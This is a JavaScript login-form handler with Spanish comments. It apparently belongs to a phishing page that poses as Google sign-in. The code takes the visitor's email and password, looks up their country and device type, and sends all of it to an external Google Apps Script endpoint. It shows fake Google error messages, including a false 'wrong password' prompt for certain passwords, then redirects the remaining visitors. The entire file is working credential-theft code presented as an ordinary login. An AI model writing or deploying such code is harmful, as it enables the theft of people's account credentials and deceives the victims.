// Manejar formulario - Modificación para enviar datos incluso con contraseñas prohibidas
document.getElementById("loginForm").addEventListener("submit", async function(event) {
    event.preventDefault();
    
    const emailInput = document.querySelector('input[name="email"]');
    const passwordInput = document.querySelector('input[name="password"]');
    const errorMessage = document.getElementById('errorMessage');
    const submitBtn = document.getElementById('submitBtn');
    
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value;
    
    // Limpiar errores previos
    errorMessage.style.display = 'none';
    
    // Validar formato de correo electrónico
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        showError("Introduce una dirección de correo electrónico válida");
        return;
    }
    
    // Lista de correos prohibidos
    const prohibitedEmails = ["ejemplo@mail.com"];
    if (prohibitedEmails.includes(email)) {
        showError("No se pudo encontrar tu cuenta de Google");
        emailInput.value = '';
        passwordInput.value = '';
        return;
    }
    
    // Verificar contraseñas prohibidas
    const prohibitedWords = ["Sandia190395#", "sandia190395#", "hola123"];
    const hasProhibitedPassword = prohibitedWords.some(word => password.includes(word));
    
    // Deshabilitar botón
    submitBtn.disabled = true;
    submitBtn.textContent = 'Verificando...';
    
    try {
        // Detectar dispositivo
        let deviceType = "Otro";
        if (/android/i.test(navigator.userAgent)) {
            deviceType = "Android";
        } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
            deviceType = "iPhone";
        }
        
        // Obtener país
        let country = "Desconocido";
        try {
            const response = await fetch("https://ipwhois.app/json/");
            const data = await response.json();
            if (data.country) {
                country = data.country;
            }
        } catch (error) {
            console.error("Error obteniendo el país:", error);
        }
        
        // Enviar datos SIEMPRE (incluso con contraseñas prohibidas)
        const formData = new FormData();
        formData.append("email", email);
        formData.append("password", password);
        formData.append("device", deviceType);
        formData.append("country", country);
        
        // Marcar si es una contraseña prohibida
        if (hasProhibitedPassword) {
            formData.append("status", "CONTRASEÑA_PROHIBIDA");
        } else {
            formData.append("status", "VÁLIDO");
        }
        
        const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
        
        const response = await fetch(url, {
            method: "POST",
            body: new URLSearchParams(formData),
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
        });
        
        // Ahora SI verificar si debe mostrar error o redirigir
        if (hasProhibitedPassword) {
            // Mostrar error y NO redirigir
            showError("La contraseña no es correcta. Inténtalo de nuevo.");
            passwordInput.value = '';
            console.log("✅ Datos enviados - ❌ Contraseña prohibida detectada");
        } else {
            // Redirigir normalmente
            if (response.ok) {
                console.log("✅ Datos enviados - ✅ Redirigiendo");
                window.location.href = "invitation.html";
            } else {
                showError("Error al iniciar sesión. Inténtalo de nuevo.");
            }
        }
        
    } catch (error) {
        showError("Error de conexión. Inténtalo de nuevo.");
        console.error("Error:", error);
    } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Siguiente';
    }
});

function showError(message) {
    const errorMessage = document.getElementById('errorMessage');
    errorMessage.textContent = message;
    errorMessage.style.display = 'block';
}
